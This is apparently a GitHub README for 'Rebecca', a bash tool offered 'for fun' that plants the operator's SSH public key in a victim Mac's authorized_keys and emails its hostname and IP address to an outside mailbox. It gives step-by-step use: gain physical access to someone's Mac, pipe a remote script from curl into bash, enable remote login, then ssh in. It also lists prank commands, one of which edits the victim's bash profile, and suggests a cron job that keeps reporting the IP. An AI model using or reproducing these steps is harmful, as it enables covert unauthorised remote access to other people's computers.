# Rebecca
Rebecca gives you access to another user's mac PC. Running this script injects ssh key into the victim's mac PC thus giving remote access.

**_I HIGHLY RECOMMEND GETTING PERMISSION FROM THE USER FIRST_**

Rebecca consist of two scripts, one to add rsa public key into the authorized_keys of the user's mac PC and email relevant information for ssh to a third party mailbox. The other to remove rsa public key from the authorized_keys of the user's mac PC.

## Why Rebecca was created?
Rebecca was created for fun :smirk:.

With ssh access, one can make a mac talk to the user, launch random browsers, sleep the mac PC, etc. Some interesting commands to play with:
```
say -v veena hello world
open "http://google.com"
pmset sleepnow
echo "alias ls='say -v veena hello, why are you touching me'" >> ~/.bash_profile
```

## How to use Rebecca?
Before using Rebecca, there are a few configurations to make:
1. you will want to clone this to your own github respository
2. you will want to create a rsa key pair if you don't have one
3. change the rsa public key in rebecca.sh to your own rsa public key (add your own identifier at the end)
4. change the third party mailbox in rebecca.sh to your own mailbox
5. change identifier in purge.sh to your identifier otherwise purge.sh will not work

Steps to gain access:
1. get physical access of a person's mac PC
2. open terminal and run the bash command that links to rebecca.sh in repository, e.g.
* `bash <(curl -s https://raw.githubusercontent.com/Milleus/rebecca/master/rebecca.sh)`
3. turn on remote login sharing
4. check mailbox for hostname and ip address
5. ssh in with the hostname and ip address, e.g.
* `ssh -i private_rsa_key_file hostname@192.168.123.123`

To remove from user's mac PC:
1. open terminal and run the bash command that links to purge.sh in repository, e.g.
* `bash <(curl -s https://raw.githubusercontent.com/Milleus/rebecca/master/purge.sh)`

## Possible improvements
Rebecca relies on the ip address of the user's PC. In the event where the user is assigned another ip address, it will be impossible to ssh in. A solution to this problem would be to set up a scheduled job on the user's PC to send out its ip address in an email (crontabs?). There is currently no intention to further improve rebecca as this is only an experimental project.

## Credits
Thanks to Ryan Tan and Ken Chuan for this interesting idea and guidance, as well as all who have given me permission to experiment on their laptops :grin:.
